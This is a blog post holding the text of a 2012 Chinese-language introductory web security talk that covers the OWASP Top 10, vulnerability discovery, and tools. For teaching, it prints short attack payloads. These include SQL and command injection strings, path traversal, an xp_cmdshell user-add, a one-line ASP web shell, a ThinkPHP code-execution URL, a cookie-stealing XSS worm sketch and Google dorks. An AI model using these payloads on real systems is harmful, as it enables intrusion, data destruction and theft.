---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2012-09-satainan-web-security/
title: "Study-Area，「網頁安全 Web Security 入門」投影片 | Orange Tsai"
author: "Orange Tsai"
published: 2012-09-28T16:00:00.000Z
description: "在 Study-Area 台南以及台中 演講的投影片，活動鏈結： http://phorum.study-area.org/index.php/topic,67659.0.html 投影片："
---

* * *

在 Study-Area 台南以及台中 演講的投影片，活動鏈結：

> [http://phorum.study-area.org/index.php/topic,67659.0.html](http://phorum.study-area.org/index.php/topic,67659.0.html)

投影片：

網頁安全 Web Security 入門 - Speaker Deck

[![Avatar for Orange](https://secure.gravatar.com/avatar/5f7ab2ea341a883bf8572190738e864e?s=47)](https://speakerdeck.com/p8361)

[網頁安全 Web Security 入門](https://speakerdeck.com/p8361/wang-ye-an-quan-web-security-ru-men)

by [Orange](https://speakerdeck.com/p8361)

[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-white-8d908558fe78e8efc8118c6fe9b9b1a9846b182c503bdc6902f97df4ddc9f3af.svg)](https://speakerdeck.com/)

## Slide 1

### Slide 1 text

網頁安全 Web Security 入門
2012/10/20 @ Study-Area




## Slide 2

### Slide 2 text

About Me
• 蔡政達 a.k.a Orange
• 2009 台灣駭客年會競
賽冠軍
• 2011 全國資安競賽金
盾獎冠軍
• 2011 東京 Avtokyo 研
討會講師
• 專精於
– 駭客攻擊手法
– Web Security
– Windows Vulnerability
Exploitation



## Slide 3

### Slide 3 text

About Me
• CHROOT Security Group 成員
• NISRA 資訊安全研究會 成員
• 偶爾做做滲透測試、講講課、接接 case.
• Blog
– http://blog.orangee.tw/



## Slide 4

### Slide 4 text

Outline
• 網頁安全分析
• 網頁漏洞檢測
• 案例分享



## Slide 5

### Slide 5 text

e10adc3949ba59abbe56e057f20f883e
你會想到甚麼？
md5sum of 123456



## Slide 6

### Slide 6 text

駭客想的和你不一樣



## Slide 7

### Slide 7 text

駭客觀察日記



## Slide 8

### Slide 8 text

http://orange.tw/wp-content/
uploads/2012/04/16552602503\_125.pdf
網址透漏了甚麼?



## Slide 9

### Slide 9 text

In The Wild.
• 七成以上的網站存在安全問題
• World Wide Web 發展至今趨近成熟
– 技術多、花樣多
• Web 是駭客最愛找洞鑽的入口點
– 防火牆無用論?
• 要當「駭客」越來越輕鬆



## Slide 10

### Slide 10 text

傻瓜工具輕輕鬆鬆入侵網站



## Slide 11

### Slide 11 text

SQL injection with Havij by 3 year old
http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html



## Slide 12

### Slide 12 text

Google Hacking Database
http://www.exploit-db.com/google-dorks/



## Slide 13

### Slide 13 text

Google Hacking Database



## Slide 14

### Slide 14 text

No content


## Slide 15

### Slide 15 text

從何開始?
• OWASP Top 10
• Open Web Application Security Project
• Web 最常見、駭客最愛看的十大安全問題



## Slide 16

### Slide 16 text

從第十名開始



## Slide 17

### Slide 17 text

10\. Insufficient Transport
Layer Protection
• 你的密碼在網路線
上飛
• 人性本善論
• 有 SSL(https) 就安全
了嗎?
– SSLstrip
– Man-in-the-middle
attack



## Slide 18

### Slide 18 text

看到就該注意一下了



## Slide 19

### Slide 19 text

9\. Insecure Cryptographic Storage
• 不安全的加密儲存
• 密碼為什麼不能存明文?
– 傳輸過程中的竊聽
– 針對性的密碼攻擊



## Slide 20

### Slide 20 text

http://plainpass.com/



## Slide 21

### Slide 21 text

8\. Unvalidated
Redirects and Forwards
• 設計對白，點下去嗎?



## Slide 22

### Slide 22 text

www.battlenet.com.cn



## Slide 23

### Slide 23 text

www.bazzaent.com



## Slide 24

### Slide 24 text

www.bazzaent.com



## Slide 25

### Slide 25 text

7\. Failure to
Restrict URL Access
• 管理者登入頁面
– http://orange.tw/admin/login.php
• 程式設計師的好習慣
– http://orange.tw/.svn/entries
• 放在網站上回家改 code 比較方便
– http://orange.tw/www.tgz
• Hack friendly 的上傳頁面
– http://orange.tw/upload.php



## Slide 26

### Slide 26 text

6\. Security Misconfiguration
• 人是最大的的弱點
• 安全的系統程式碰上沒有安全意識的人?
• 系統更新到最新?
• 設定是照著系統的預設設定?
• 密碼是預設密碼或是弱密碼?
– 網路環境比較複雜時，你旁邊的系統呢?



## Slide 27

### Slide 27 text

未做好程式錯誤的 handling



## Slide 28

### Slide 28 text

選用過舊的應用程式版本



## Slide 29

### Slide 29 text

5\. Cross-Site Request Forgery
• 未授權的使用者請
求偽造
• 通常配合後面的
XSS 一起利用
• ex 網站自動讀圖
– /logout
– /transfer?to=hacker
&amount=10000



## Slide 30

### Slide 30 text

4\. Insecure Direct
Object References
• 問: 駭客看到下面網址的直覺反應是?
• http://orange.tw/index.php?mod=news
– /index.php?mod=login
– /index.php?mod=admin
• http://orange.tw/news.php?id=1&act=view
– /news.php?id=1&act=edit
– /news.php?id=1&act=upload



## Slide 31

### Slide 31 text

http://orange.tw/download.php
?file=sa-at-tainan.doc
背後是如何實現下載功能的 ?



## Slide 32

### Slide 32 text

download.php



## Slide 33

### Slide 33 text

• download.php?file=sa-at-tainan.doc
/var/www/uploads/sa-at-tainan.doc
• download.php?file=../download.php
/var/www/uploads/../download.php
• download.php?file=../../../etc/passwd
/var/www/uploads/../../../etc/passwd



## Slide 34

### Slide 34 text

3\. Broken Authentication and Session
Management
• Cookie or Session
– Set-Cookie: admin=0;
• 只用 JavaScript 的身分驗證
– alert( '沒有權限' ); history.back();
• 不安全的 Cookie 產生方式



## Slide 35

### Slide 35 text

2\. Cross-Site Scripting
• 俗稱 XSS
• 攻擊對象非網站本身，而是針對用戶端
• 植入惡意的 HTML, CSS, Javascript, VBScript
等



## Slide 36

### Slide 36 text

No content


## Slide 37

### Slide 37 text

No content


## Slide 38

### Slide 38 text

No content


## Slide 39

### Slide 39 text

Cont.

stealCookie( hackerIP, document.cookie );
var friends = getAllFriends();
for ( var friend in friends )
sendMessage( friend, evilCode );




## Slide 40

### Slide 40 text

1\. Injection
• 網頁程式未對使用者輸入的資料做檢查，給
駭客有機會植入惡意的指令的機會
• SQL Injection
• Command Injection
• Code, Xpath, Ldap Injection..



## Slide 41

### Slide 41 text

Command Injection(1/3)
• Pipe & terminator
– cat /etc/passwd \| less
– echo 1; echo 2 ;



## Slide 42

### Slide 42 text

Command Injection(2/3)
';
system( 'nslookup ' . $cmd );



## Slide 43

### Slide 43 text

Command Injection(3/3)
• ip.php?domain=orange.tw
– cmd = 'nslookup orange.tw'
• ip.php?domain=orange.tw \| shutdown -r
– cmd = 'nslookup orange.tw \| shutdown -r‘
• 使用者輸入汙染了系統執行的指令。



## Slide 44

### Slide 44 text

SQL Injection (1/3)
• news.php?id=3
– SELECT \* FROM news WHERE id=3
• news.php?id=sleep(123)
– SELECT \* FROM news WHERE id=sleep(123)
• news.php?id=3 and left(pwd, 1)='a'
– SELECT \* FROM news WHERE id=3 and left(pwd, 1)='a'



## Slide 45

### Slide 45 text

SQL Injection (2/3)
• login.asp # admin / 123456
– SELECT \* FROM user WHERE name='admin' and pwd=
'123456'
• login.asp # admin'--
– SELECT \* FROM user WHERE name='admin'--' and ……
• login.asp # admin';DROP table ...
– SELECT \* FROM user WHERE name='admin';DROP
table user;--' and ……



## Slide 46

### Slide 46 text

SQL Injection (3/3)
• news.asp?id=3;EXEC master..xp\_cmdshell
'net user sa /add';--
– SELECT \* FROM news WHERE id=3;EXEC
master..xp\_cmdshell 'net user orange /add';--
• 使用者輸入汙染了 SQL 語句。



## Slide 47

### Slide 47 text

漏洞那麼多，頭昏眼花
休息十分鐘



## Slide 48

### Slide 48 text

網頁漏洞檢測
自動化 vs. 手動



## Slide 49

### Slide 49 text

w3af
http://w3af.sourceforge.net/



## Slide 50

### Slide 50 text

w3af



## Slide 51

### Slide 51 text

Jsky
http://nosec.org/en/productservice/jsky/



## Slide 52

### Slide 52 text

Jsky



## Slide 53

### Slide 53 text

網頁漏洞是如何被找出來? (1/3)
• 觀察、分析
• 網頁功能是如何實現的?
• 分析輸入輸出的結果
• 正確的輸入正確的輸出
• 錯誤的輸入錯誤的輸出



## Slide 54

### Slide 54 text

網頁漏洞是如何被找出來? (2/3)
• 網頁的上傳功能
– 檢查附檔名 ?
– 檢查 Content-Type ?
– 檢查檔案內容 ?
• 網頁的上傳掃毒功能
– 如何實現 ?
– 實現的程式碼可能有甚麼問題 ?
– clamscan -i filename.jpg \| sleep 12345 …



## Slide 55

### Slide 55 text

網頁漏洞是如何被找出來? (3/3)
• 只有了解溝通的語言才能選擇好的(錯誤)的
輸入
• 只有了解架構才能知道哪裡容易出問題
• HTTP Protocol
• SQL PHP ASP Java JavaScript Tomcat Apache…



## Slide 56

### Slide 56 text

HTTP Request
GET /robots.txt HTTP/1.1
Host: orange.tw
User-Agent: Mozilla/5.0
Accept-Language: zh-tw,en-us;
Accept-Encoding: gzip, deflate
Referer: http://www.google.com.tw/
Cookie: user=admin



## Slide 57

### Slide 57 text

HTTP Response
HTTP/1.1 200 OK
Last-Modified: Tue, 19 Jul 2011 21:46:37
GMT
Server: Apache/2.2.3 (Oracle)
Content-Length: 64
Content-Type: text/plain; charset=UTF-8




## Slide 58

### Slide 58 text

Cont. 案例分享
不正確的程式寫法可以任意偽造 IP 位置
GET /getIP HTTP/1.1
Host: orange.tw
X-Forwarded-For: 127.0.0.1



## Slide 59

### Slide 59 text

錯誤示範(google://php get ip)
function getIp() {
$ip = $\_SERVER\['REMOTE\_ADDR'\];
if (!empty($\_SERVER\['HTTP\_CLIENT\_IP'\])) {
$ip = $\_SERVER\['HTTP\_CLIENT\_IP'\];
} elseif (!empty($\_SERVER\[‘HTTP\_X\_FORWARDED\_FOR’\])) {
$ip = $\_SERVER\['HTTP\_X\_FORWARDED\_FOR'\];
}
return $ip;
}



## Slide 60

### Slide 60 text

Cont. 案例分享
不安全的伺服器設置造成可任意寫入檔案
PUT /cmd.asp HTTP/1.1
Host: orange.tw
Content-Length: 24
<%execute(request(cmd));%>



## Slide 61

### Slide 61 text

WebDAV



## Slide 62

### Slide 62 text

Cont. 案例分享
PHP CGI Argument
Injection
http://test/index.php
http://test/index.php?-s
http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/



## Slide 63

### Slide 63 text

Cont. 案例分享
不嚴謹的字串檢查可造成
任意密碼登入
' or ''=' /
SELECT \* FROM admin
WHERE user='' or ''='' and pwd=''



## Slide 64

### Slide 64 text

Cont. 案例分享
• Struts2 ognl 任意代碼執行漏洞
• Java MVC Framework
• CVE-2011-3923



## Slide 65

### Slide 65 text

http://www.wooyun.org/bugs/wooyun-2010-08981



## Slide 66

### Slide 66 text

http://www.wooyun.org/bugs/wooyun-2010-08981



## Slide 67

### Slide 67 text

Cont. 案例分享
Think PHP 任意代碼執行漏洞



## Slide 68

### Slide 68 text

ThinkPHP 代碼執行漏洞
https://orange.tw/index.php?s=module/action/
param1/${@system($\_GET\[cmd\])}
&cmd=cat config.php
$res =
preg\_replace('@(w+)'.$depr.'(\[^'.$depr.'\\/\]+)@e',
'$var\[\\'\\\1\\'\]="\\\2";', implode($depr,$paths));



## Slide 69

### Slide 69 text

用來協助分析的小工具



## Slide 70

### Slide 70 text

Google Hacking
Google is your BEST friend.



## Slide 71

### Slide 71 text

• apple orange
• apple -orange
• "apple orange"
• site:orange.tw
• site:orange.tw inurl:air
• site:orange.tw filetype:php



## Slide 72

### Slide 72 text

"index of" 徐佳瑩 mp3



## Slide 73

### Slide 73 text

site:gov.cn filetype:xls 密碼



## Slide 74

### Slide 74 text

inurl:cmd filetype:asp "system32"



## Slide 75

### Slide 75 text

Burp Suite - Proxy
http://portswigger.net/burp/



## Slide 76

### Slide 76 text

Burp Suite - Spider
http://portswigger.net/burp/



## Slide 77

### Slide 77 text

Burp Suite - Decoder
http://portswigger.net/burp/



## Slide 78

### Slide 78 text

FireFox–Tamper Data



## Slide 79

### Slide 79 text

FireFox–HackBar



## Slide 80

### Slide 80 text

FireFox–User Agent Switcher



## Slide 81

### Slide 81 text

小練習
http://demosite.com/sa.php



## Slide 82

### Slide 82 text

Q & A



## Slide 83

### Slide 83 text

Thanks :)